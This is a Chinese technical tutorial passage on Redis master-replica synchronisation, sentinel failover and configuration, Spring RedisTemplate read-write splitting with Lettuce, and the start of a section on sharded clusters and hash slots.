<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmJlZWY1ODcwYmU5YzI3ZTBkNTUxMWE2N2Y5NDgwMjNfV3N2Z3pqVVFEb01xY2lTQWFCbUR5RkNpazhwcWlsT2VfVG9rZW46UWtLRGIydnNMb3ZlbmJ4MUx0SmNPc3kxblJlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>如图所示，集群中有一个master节点、两个slave节点（现在叫replica）。当我们通过Redis的Java客户端访问主从集群时，应该做好路由：</p>
<ul>
<li>如果是写操作，应该访问master节点，master会自动将数据同步给两个slave节点</li>
<li>如果是读操作，建议访问各个slave节点，从而分担并发压力</li>
</ul>
<p><strong>主机网络模式的使用场景</strong>：</p>
<ul>
<li><code>host</code> 模式适合对性能要求较高的场景，例如需要极低的网络延迟。</li>
<li>如果不需要共享主机网络，可以考虑使用 <code>bridge</code> 网络模式，并通过 <code>ports</code> 映射端口。</li>
</ul>
<p>虽然我们启动了3个Redis实例，但是它们并没有形成主从关系。我们需要通过命令来配置主从关系：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Redis5.0以前</span></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"><span class="comment"># Redis5.0以后</span></span><br><span class="line">replicaof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure>
<p>有临时和永久两种模式：</p>
<ul>
<li>永久生效：在redis.conf文件中利用<code>slaveof</code>命令指定<code>master</code>节点</li>
<li>临时生效：直接利用redis-cli控制台输入<code>slaveof</code>命令，指定<code>master</code>节点</li>
</ul>
<h2 id="主从同步原理">主从同步原理</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmVhZjQ0ZTEyYzQ2ZWYzMTMzMjZhMzk0MjA0ZTE1YmJfanM2V0c4TUsxb2VlVjYwSDZiNnhoS2NvT1ZpWklpOXhfVG9rZW46RzNYQmJiQjVTb1Y5Y3Z4cGJiU2NMVzZ2bndkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDE2MDI5NzRiNmE4YjNhNjQ2Zjc5MDBkYWU2NTcyYTlfdTZxbWd2Rk1tS1hsM1hCOXN2TEdncTF5bDhBQ09nWjJfVG9rZW46SkNMT2JVS0h4b0xKdjZ4T0lkMWNRMXdYbnNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>有几个概念，可以作为判断依据：</p>
<ul>
<li><strong><code>Replication Id</code></strong>：简称<code>replid</code>，是数据集的标记，replid一致则是同一数据集。每个<code>master</code>都有唯一的<code>replid</code>，<code>slave</code>则会继承<code>master</code>节点的<code>replid</code></li>
<li><strong><code>offset</code></strong>：偏移量，随着记录在<code>repl_baklog</code>中的数据增多而逐渐增大。<code>slave</code>完成同步时也会记录当前同步的<code>offset</code>。如果<code>slave</code>的<code>offset</code>小于<code>master</code>的<code>offset</code>，说明<code>slave</code>数据落后于<code>master</code>，需要更新。</li>
</ul>
<p>因此<code>slave</code>做数据同步，必须向<code>master</code>声明自己的<code>replication id </code>和<code>offset</code>，<code>master</code>才可以判断到底需要同步哪些数据。</p>
<p>由于我们在执行<code>slaveof</code>命令之前，所有redis节点都是<code>master</code>，有自己的<code>replid</code>和<code>offset</code>。</p>
<p>当我们第一次执行<code>slaveof</code>命令，与<code>master</code>建立主从关系时，发送的<code>replid</code>和<code>offset</code>是自己的，与<code>master</code>肯定不一致。</p>
<p><code>master</code>判断发现<code>slave</code>发送来的<code>replid</code>与自己的不一致，说明这是一个全新的slave，就知道要做全量同步了。</p>
<p><code>master</code>会将自己的<code>replid</code>和<code>offset</code>都发送给这个<code>slave</code>，<code>slave</code>保存这些信息到本地。自此以后<code>slave</code>的<code>replid</code>就与<code>master</code>一致了。</p>
<p>完整流程描述：</p>
<ul>
<li><code>slave</code>节点请求增量同步</li>
<li><code>master</code>节点判断<code>replid</code>，发现不一致，拒绝增量同步</li>
<li><code>master</code>将完整内存数据生成<code>RDB</code>，发送<code>RDB</code>到<code>slave</code></li>
<li><code>slave</code>清空本地数据，加载<code>master</code>的<code>RDB</code></li>
<li><code>master</code>将<code>RDB</code>期间的命令记录在<code>repl_baklog</code>，并持续将log中的命令发送给<code>slave</code></li>
<li><code>slave</code>执行接收到的命令，保持与<code>master</code>之间的同步</li>
</ul>
<p>全量同步需要先做RDB，然后将RDB文件通过网络传输个slave，成本太高了。因此除了第一次做全量同步，其它大多数时候slave与master都是做<strong>增量同步</strong>。</p>
<p>什么是增量同步？就是只更新slave与master存在差异的部分数据。</p>
<p>master怎么知道slave与自己的数据差异在哪里呢?</p>
<p>这就要说到全量同步时的<code>repl_baklog</code>文件了。这个文件是一个固定大小的数组，只不过数组是环形，也就是说<strong>角标到达数组末尾后，会再次从0开始读写</strong>，这样数组头部的数据就会被覆盖。</p>
<p><code>repl_baklog</code>中会记录Redis处理过的命令及<code>offset</code>，包括master当前的<code>offset</code>，和slave已经拷贝到的<code>offset</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJlZTI5NzA4MjZjMzEyMGRlMTM2MzE2OWNhZTQzNTRfVHQ5ajVaeVpOZlc3MDJScE1vQzJ3MklqWWpmV3gyZ3pfVG9rZW46S0I1ZGJJb0ZMb0tIZFN4RXdtNGNPVWZhblNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>slave与master的offset之间的差异，就是salve需要增量拷贝的数据了。</p>
<p>随着不断有数据写入，master的offset逐渐变大，slave也不断的拷贝，追赶master的offset：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTE2ZmJkYWIyMDEwNTllMDI2NGRhMzZiNDViYjVmZDJfOU9zTnVkQ053QVJnOTN2UTN1YUdpU3dpSFJkaXl3QkFfVG9rZW46VHJJbWJkM2ZBb1VxT0p4ZUVlbGNzaDU1bk5iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>直到数组被填满：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTg1N2FiMzNiYTM3ZjY4NDhmNDE5MmJlZThjN2U2MmJfVDZkNzI1RU5oN3lsMHl1SXRRaHVFYzVwNkhBYU1lbjNfVG9rZW46SkxuMGJ3SmNDb2pBWFp4Rk94S2NOSVFPbjhmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>此时，如果有新的数据写入，就会覆盖数组中的旧数据。不过，旧的数据只要是绿色的，说明是已经被同步到slave的数据，即便被覆盖了也没什么影响。因为未同步的仅仅是红色部分：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzBhYjMzMjY4YmUwZDBiMGRmNDFiZThhNjg4NDk4ZWZfZDhQelNGdmtjRThjQjVGR0h0eTU3VVdNSDlNRkRnMjJfVG9rZW46UjJJYmJZRUtBb05PZGp4Y1RrZmNMQTA5bmRnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>但是，如果slave出现网络阻塞，导致master的<code>offset</code>远远超过了slave的<code>offset</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjQ5ZTVjYTU2NGViNjNkMjc1Y2MxYzcxN2Q4YTUwM2NfcDFuT3VoZWJzR3BYdkdHSkh6NE91Y1pvYm94WHd3OExfVG9rZW46TmZWQ2IyTFQwb2hPTTN4TWJLeWNUc3RObllkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>如果master继续写入新数据，master的<code>offset</code>就会覆盖<code>repl_baklog</code>中旧的数据，直到将slave现在的<code>offset</code>也覆盖：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjllNThiNjA1MmE5MDVlM2YxOTliYjE4NTkxOWQ3ZTZfRXhSb0hFYWZtUEFiUEtkSEo3UWl5V25JVHM0SFpPTVFfVG9rZW46UVZxWmJQeTlQb2szZDl4VEFyQWNvdEpyblRpXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>棕色框中的红色部分，就是尚未同步，但是却已经被覆盖的数据。此时如果slave恢复，需要同步，却发现自己的<code>offset</code>都没有了，无法完成增量同步了。只能做<strong>全量同步</strong>。</p>
<p><code>repl_baklog</code>大小有上限，写满后会覆盖最早的数据。如果slave断开时间过久，导致尚未备份的数据被覆盖，则无法基于<code>repl_baklog</code>做增量同步，只能再次全量同步。</p>
<h3 id="主从同步优化">主从同步优化</h3>
<p>主从同步可以保证主从数据的一致性，非常重要。</p>
<p>可以从以下几个方面来优化Redis主从就集群：</p>
<ul>
<li>在master中配置<code>repl-diskless-sync  yes</code>启用无磁盘复制，避免全量同步时的磁盘IO。</li>
<li>Redis单节点上的内存占用不要太大，减少RDB导致的过多磁盘IO</li>
<li>适当提高<code>repl_baklog</code>的大小，发现slave宕机时尽快实现故障恢复，尽可能避免全量同步</li>
<li>限制一个master上的slave节点数量，如果实在是太多slave，则可以采用<code>主-从-从</code>链式结构，减少master压力</li>
</ul>
<p><code>主-从-从</code>架构图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGI2NzBlYTUyNzZiMDcyYTBlYzJiMTFlZDJmZTBhZDBfSlNmUjFxMklFa1hZN2xKOHpHWkxDVTRTVDJYMlFnQ2RfVG9rZW46QTZOa2JWRzEzb2ZoRm14U2RDZGNuUzM2bjlWXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>简述全量同步和增量同步区别？</p>
<ul>
<li>全量同步：master将完整内存数据生成RDB，发送RDB到slave。后续命令则记录在repl_baklog，逐个发送给slave。</li>
<li>增量同步：slave提交自己的offset到master，master获取repl_baklog中从offset之后的命令给slave</li>
</ul>
<p>什么时候执行全量同步？</p>
<ul>
<li>slave节点第一次连接master节点时</li>
<li>slave节点断开时间太久，repl_baklog中的offset已经被覆盖时</li>
</ul>
<p>什么时候执行增量同步？</p>
<ul>
<li>slave节点断开又恢复，并且在<code>repl_baklog</code>中能找到offset时</li>
</ul>
<h2 id="哨兵原理">哨兵原理</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWJlMzY0MWRjMDU0YThmMDYwY2QwMWMyYzE2M2VlODJfM2ViaGd0NjdQYk1YbXVYempHSU1SdUlXbUtFb0NEVHlfVG9rZW46RGVYZmJuckhkb1E1cVN4TUloY2NoTzBUbkpkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>哨兵的作用如下：</p>
<ul>
<li><strong>状态监控</strong>：<code>Sentinel</code> 会不断检查您的<code>master</code>和<code>slave</code>是否按预期工作</li>
<li><strong>故障恢复（failover）</strong>：如果<code>master</code>故障，<code>Sentinel</code>会将一个<code>slave</code>提升为<code>master</code>。当故障实例恢复后会成为<code>slave</code></li>
<li><strong>状态通知</strong>：<code>Sentinel</code>充当<code>Redis</code>客户端的服务发现来源，当集群发生<code>failover</code>时，会将最新集群信息推送给<code>Redis</code>的客户端</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWJjMmMyMjUyMmMwMzg3YWU4OTIzMjExNjI0MjFhNmRfeHB0OGVmbW9mcFhwQ3ozYjl0M2RzVHZrRUZBcHgzdGdfVG9rZW46Qlg3TGJPUTBtbzJab3h4ek1XbGM3UnBFbjhqXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><code>Sentinel</code>基于心跳机制监测服务状态，每隔1秒向集群的每个节点发送ping命令，并通过实例的响应结果来做出判断：</p>
<ul>
<li><strong>主观下线（sdown）</strong>：如果某sentinel节点发现某Redis节点未在规定时间响应，则认为该节点主观下线。</li>
<li><strong>客观下线(odown)</strong>：若超过指定数量（通过<code>quorum</code>设置）的sentinel都认为该节点主观下线，则该节点客观下线。quorum值最好超过Sentinel节点数量的一半，Sentinel节点数量至少3台。</li>
</ul>
<p>一旦发现master故障，sentinel需要在salve中选择一个作为新的master，选择依据是这样的：</p>
<ul>
<li>首先会判断slave节点与master节点断开时间长短，如果超过<code>down-after-milliseconds * 10</code>则会排除该slave节点</li>
<li>然后判断slave节点的<code>slave-priority</code>值，越小优先级越高，如果是0则永不参与选举（默认都是1）。</li>
<li>如果<code>slave-prority</code>一样，则判断slave节点的<code>offset</code>值，越大说明数据越新，优先级越高</li>
<li>最后是判断slave节点的<code>run_id</code>大小，越小优先级越高（<code>通过info server可以查看run_id</code>）。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NzM2NjY2ODM5OTNhNTA1Njk1ZDdkNmNlNzIyOWQ3MzFfU1ZKUFV1RU1SWDQ1aXN1aEx1RGFpNjBPSE5sS3pQWlJfVG9rZW46UWNmemJVWTRJb2xkMGJ4ZXkzamNBM2xDbnpkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="搭建哨兵集群">搭建哨兵集群</h2>
<p>首先，我们停掉之前的redis集群：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 老版本DockerCompose</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新版本Docker</span></span><br><span class="line">docker compose down</span><br></pre></td></tr></table></figure>
<p>然后，我们找到课前资料提供的sentinel.conf文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQxNjU2YjJmMjU1ZDEyMjgyNGU4ZGE4N2JmMTljMGZfbGpOcGdSSHNNa0tVUGs1NmNGaDQ4OVF3VkVQT05KRWRfVG9rZW46V1lveGJkcWlqb202TWV4SkRwTmNJWno5bmVmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>其内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sentinel announce-ip <span class="string">&quot;192.168.150.101&quot;</span></span><br><span class="line">sentinel monitor hmaster 192.168.150.101 7001 2</span><br><span class="line">sentinel down-after-milliseconds hmaster 5000</span><br><span class="line">sentinel failover-timeout hmaster 60000</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><code>sentinel announce-ip &quot;192.168.150.101&quot;</code>：声明当前sentinel的ip</li>
<li><code>sentinel monitor hmaster 192.168.150.101 7001 2</code>：指定集群的主节点信息
<ul>
<li><code>hmaster</code>：主节点名称，自定义，任意写</li>
<li><code>192.168.150.101 7001</code>：主节点的ip和端口</li>
<li><code>2</code>：认定<code>master</code>下线时的<code>quorum</code>值</li>
</ul>
</li>
<li><code>sentinel down-after-milliseconds hmaster 5000</code>：声明master节点超时多久后被标记下线</li>
<li><code>sentinel failover-timeout hmaster 60000</code>：在第一次故障转移失败后多久再次重试</li>
</ul>
<p>接下来，我们演示一下当主节点故障时，哨兵是如何完成集群故障恢复（failover）的。</p>
<p>稍微等待一段时间后，会发现sentinel节点触发了<code>failover</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRlNWMxYzE4NTQ4YTlkNWM3MjJhNjIwMjY0MzU4YWZfbWs5TDg5NHFTajN1cmxZdkpYOGZ3YjQ3cXhUVDl1QUhfVG9rZW46WUwzY2JvelVibzdMVGR4bEJoUGNIYzlTblpmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>故障转移步骤有哪些？</p>
<ul>
<li>首先要在<code>sentinel</code>中选出一个<code>leader</code>，由leader执行<code>failover</code></li>
<li>选定一个<code>slave</code>作为新的<code>master</code>，执行<code>slaveof noone</code>，切换到master模式</li>
<li>然后让所有节点都执行<code>slaveof</code> 新master</li>
<li>修改故障节点配置，添加<code>slaveof</code> 新master</li>
</ul>
<p>sentinel选举leader的依据是什么？</p>
<ul>
<li>票数超过sentinel节点数量1半</li>
<li>票数超过quorum数量</li>
<li>一般情况下最先发起failover的节点会当选</li>
</ul>
<h2 id="RedisTemplate连接哨兵集群">RedisTemplate连接哨兵集群</h2>
<p>配置 <strong>RedisTemplate 连接 Redis 哨兵集群</strong> 的整个过程分为三大步骤，下面我会详细地讲解每一步的实现，包括关键配置和代码示例。</p>
<h3 id="1-引入依赖"><strong>1. 引入依赖</strong></h3>
<p>在 Maven 项目中，需要添加 <code>spring-boot-starter-data-redis</code> 依赖，这是 Spring 提供的 Redis 支持，能够简化 Redis 操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-配置哨兵集群"><strong>2. 配置哨兵集群</strong></h3>
<p>哨兵集群负责监控 Redis 主节点的状态并进行故障转移。与单点模式不同，哨兵模式只需要提供哨兵节点的地址，不需要直接配置主从节点。以下是具体配置步骤：</p>
<p>在 Spring Boot 的配置文件 <code>application.yml</code> 中，添加以下内容：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">    redis:</span><br><span class="line">        sentinel:</span><br><span class="line">            master: hmaster # 集群的主节点名称（由 Redis Sentinel 配置文件中 `sentinel monitor` 指定）</span><br><span class="line">            nodes: # 哨兵节点地址列表</span><br><span class="line">                - <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span>:<span class="number">27001</span></span><br><span class="line">                - <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span>:<span class="number">27002</span></span><br><span class="line">                - <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span>:<span class="number">27003</span></span><br><span class="line">        database: <span class="number">0</span> # Redis 数据库索引（默认是 <span class="number">0</span>）</span><br><span class="line">        timeout: 5000ms # 超时时间</span><br><span class="line">        password: yourpassword # 如果 Redis 设置了密码，填入此处（可选）</span><br></pre></td></tr></table></figure>
<h3 id="3-配置读写分离"><strong>3. 配置读写分离</strong></h3>
<p>读写分离是 Redis 哨兵模式的一个重要特性，通过 Spring Data Redis 可以轻松实现。需要自定义一个 Bean 来设置读写策略。</p>
<h4 id="代码实现"><strong>代码实现</strong></h4>
<p>在 Spring Boot 项目中，定义一个配置类，例如 <code>RedisConfig</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.lettuce.LettuceClientConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.lettuce.LettuceClientConfigurationBuilderCustomizer;</span><br><span class="line"><span class="keyword">import</span> io.lettuce.core.ReadFrom;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configurationpublic</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置 Redis 哨兵模式的读写策略</span></span><br><span class="line"><span class="comment">     */</span><span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LettuceClientConfigurationBuilderCustomizer <span class="title function_">clientConfigurationBuilderCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> clientConfigurationBuilder -&gt; clientConfigurationBuilder.readFrom(ReadFrom.REPLICA_PREFERRED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="读写策略说明"><strong>读写策略说明</strong></h4>
<p>在 <code>ReadFrom</code> 中定义了四种常用的读写策略：</p>
<ol>
<li><strong><code>MASTER</code></strong>：所有请求都从主节点读取。</li>
<li><strong><code>MASTER_PREFERRED</code></strong>：优先从主节点读取，主节点不可用时再从从节点读取。</li>
<li><strong><code>REPLICA</code></strong>：所有请求都从从节点读取。</li>
<li><strong><code>REPLICA_PREFERRED</code></strong>：优先从从节点读取，所有从节点不可用时再从主节点读取。</li>
</ol>
<blockquote>
<p><strong>注意：</strong> 默认的读写策略是从主节点读取。如果你的场景需要优先读取从节点，使用 <code>REPLICA_PREFERRED</code> 是一个不错的选择。</p>
</blockquote>
<h3 id="4-测试-Redis-哨兵模式"><strong>4. 测试 Redis 哨兵模式</strong></h3>
<p>编写一个简单的测试代码，验证 Redis 哨兵模式的连接和读写分离是否生效。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test-redis&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testRedis</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 写入数据（写请求将发送到主节点）</span></span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;testKey&quot;</span>, <span class="string">&quot;Hello Redis Sentinel!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取数据（读请求将优先发送到从节点）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> redisTemplate.opsForValue().get(<span class="string">&quot;testKey&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Value: &quot;</span> + value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>启动应用程序后访问 <code>/test-redis</code>，可以看到 Redis 的写入和读取结果。</p>
<h3 id="5-验证读写分离"><strong>5. 验证读写分离</strong></h3>
<p>可以通过以下方式验证是否正确配置了读写分离：</p>
<ol>
<li><strong>监控日志：</strong> 在 Redis 哨兵或主从节点的日志中查看请求分布情况，检查写请求是否都发送到主节点，读请求是否发送到从节点。</li>
<li><strong>断开主节点：</strong> 暂时关闭主节点，观察系统是否能够正常读取从节点数据。</li>
<li><strong>Spring Debug：</strong> 在 Spring 项目中开启 <code>debug=true</code>，可以查看 Lettuce 客户端的连接日志，验证是否正确使用了从节点。</li>
</ol>
<h3 id="6-总结">6.<strong>总结</strong></h3>
<p>通过上述三步设置，Redis 哨兵集群模式的连接和读写分离就成功完成了。</p>
<ul>
<li><strong>哨兵模式</strong> 提供了主节点故障转移的高可用能力。</li>
<li><strong>读写分离</strong> 提高了系统的并发性能和稳定性。</li>
</ul>
<h2 id="分片集群">分片集群</h2>
<h3 id="搭建分片集群、认识散列插槽">搭建分片集群、认识散列插槽</h3>
<p>主从模式可以解决高可用、高并发读的问题。但依然有两个问题没有解决：</p>
<ul>
<li>海量数据存储</li>
<li>高并发写</li>
</ul>
<p>要解决这两个问题就需要用到分片集群了。分片的意思，就是把数据拆分存储到不同节点，这样整个集群的存储数据量就更大了。</p>
<p>Redis分片集群的结构如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjhlM2VlOTQ2ZWEyZWU3ODUyZWQ3OWFmNzE4NDljYzVfZW5RaWQ2YUdqUXlHaVQ0dzVXSHBMV2lhck5IZ08xN1hfVG9rZW46SzJKNmJEb2Fub2NiOWZ4Nm9Ec2M3Y2k2bktoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>分片集群特征：</p>
<ul>
<li>集群中有多个master，每个master保存不同分片数据 ，解决海量数据存储问题</li>
<li>每个master都可以有多个slave节点 ，确保高可用</li>
<li>master之间通过ping监测彼此健康状态 ，类似哨兵作用</li>
<li>客户端请求可以访问集群任意节点，最终都会被转发到数据所在节点</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGEzMmYyZDZhNTQ5MGRhYzA4MDc1ZDBmYzZjZWM1ZTlfM0RJTVVqcGczcWpTU09NYW40T25VV1FNbkhBaXJSMWpfVG9rZW46WnNMVGJ2emtFb09QMnd4NlFSbGNBa0Fnbm9iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>数据要分片存储到不同的Redis节点，肯定需要有分片的依据，这样下次查询的时候才能知道去哪个节点查询。很多数据分片都会采用一致性hash算法。而Redis则是利用散列插槽（<strong><code>hash slot</code></strong>）的方式实现数据分片。</p>
<p>在Redis集群中，共有16384个<code>hash slots</code>，集群中的每一个master节点都会分配一定数量的<code>hash slots</code>。具体的分配在集群创建时就已经指定了：</p>
